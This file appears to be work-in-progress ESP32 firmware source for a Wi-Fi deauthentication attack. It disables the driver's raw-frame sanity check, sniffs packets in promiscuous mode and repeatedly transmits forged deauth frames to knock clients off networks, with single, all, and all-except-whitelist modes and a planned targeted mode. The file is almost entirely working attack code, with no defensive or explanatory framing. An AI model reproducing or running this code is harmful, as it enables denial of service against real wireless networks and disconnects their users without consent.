#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_station;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

bool add_to_whitelist(const char *mac_str){
  if (whitelist_count >= MAX_WHITELISTED) return false;

  uint8_t mac[6]; // 6bytes 
  if (sscanf(mac_str,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                      &mac[0], &mac[1], &mac[2],
                      &mac[3], &mac[4], &mac[5]) !=6 ) {
    return false; // Error wrong format
   }
  
  for (int i = 0; i < whitelist_count; i++ ){
    if(memcmp(whitelist[i], mac, 6) == 0) return false;
  }

  memcpy(whitelist[whitelist_count], mac, 6);
  return true;
}


esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  switch (deauth_type) {
      case DEAUTH_TYPE_SINGLE :{
        if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
          memcpy(deauth_frame.station, mac_header->src, 6);
          for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
          }
          eliminated_stations++;
          DEBUG_PRINTF("Sent SINGLE deauth to %02X:%02X:%02X:%02X:%02X:%02X\n",
              mac_header->src[0], mac_header->src[1], mac_header->src[2],
              mac_header->src[3], mac_header->src[4], mac_header->src[5]);
          BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
        }
        break;
      }

      case DEAUTH_TYPE_ALL :{
        if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
          memcpy(deauth_frame.station, mac_header->src, 6);
          memcpy(deauth_frame.access_point, mac_header->dest, 6);
          memcpy(deauth_frame.sender, mac_header->dest, 6);
          for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
          esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
          }
        DEBUG_PRINTF("Sent ALL deauth to %02X:%02X:%02X:%02X:%02X:%02X\n",
            mac_header->src[0], mac_header->src[1], mac_header->src[2],
            mac_header->src[3], mac_header->src[4], mac_header->src[5]);
        BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
        }
        break;
      }

      case DEAUTH_TYPE_ALL_EXCEPT :{
        if((memcmp(mac_header->src, whitelist, 6) == 0 )) return; // Whitelist checker
        else { 
          if((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6)!=0)){ //Network checker 
            memcpy(deauth_frame.station,mac_header->src, 6);
            memcpy(deauth_frame.access_point, whitelist, 6); 
            for (int i=0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
            //Not gonna add eliminated stations, more than 5 deauths we pushing the esp's limit
          }
        }
        break;
      }

      case DEAUTH_TYPE_TARGETED :{
          break;
      }
      

  }




}  
/*
HOW TO STUCTURE 
 VOID SNIFFER(){
 switch() {
    case DEAUTH_TYPE_SINGLE:{
    same mech as before;

    DEBUG_PRINT()
        mac blablabla,
        mac blabla bla ;
    BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
    break;
    }

    case DEAUTH_TYPE_ALL:{
    same mechanism as before

    DEBUG_PRINT()
        mac blablabla,
        mac blabla bla ;
    BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);

    break;
    }

    case DEAUTH_TYPE_ALL_EXCEPT:{
    mechanism as DEAUTH_TYPE_SINGLE but comparison checker of input;
    gotta add new header for the inputa white list in types >> 

    DEBUG_PRINT()
     too much info to print just say deauth all works depends tho
    break;
    }

    case DEAUTH_TYPE_TARGETED: {
      get the mac as input and place it in the deauth frame 

      DEBUG_PRINT()
        mac blablabla,
        mac blabla bla ;
      BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
      break;
    }
  }
 }
*/

/* 
to do 
1.)Think of the reason addition 
2.)A way to stop
3.)
*/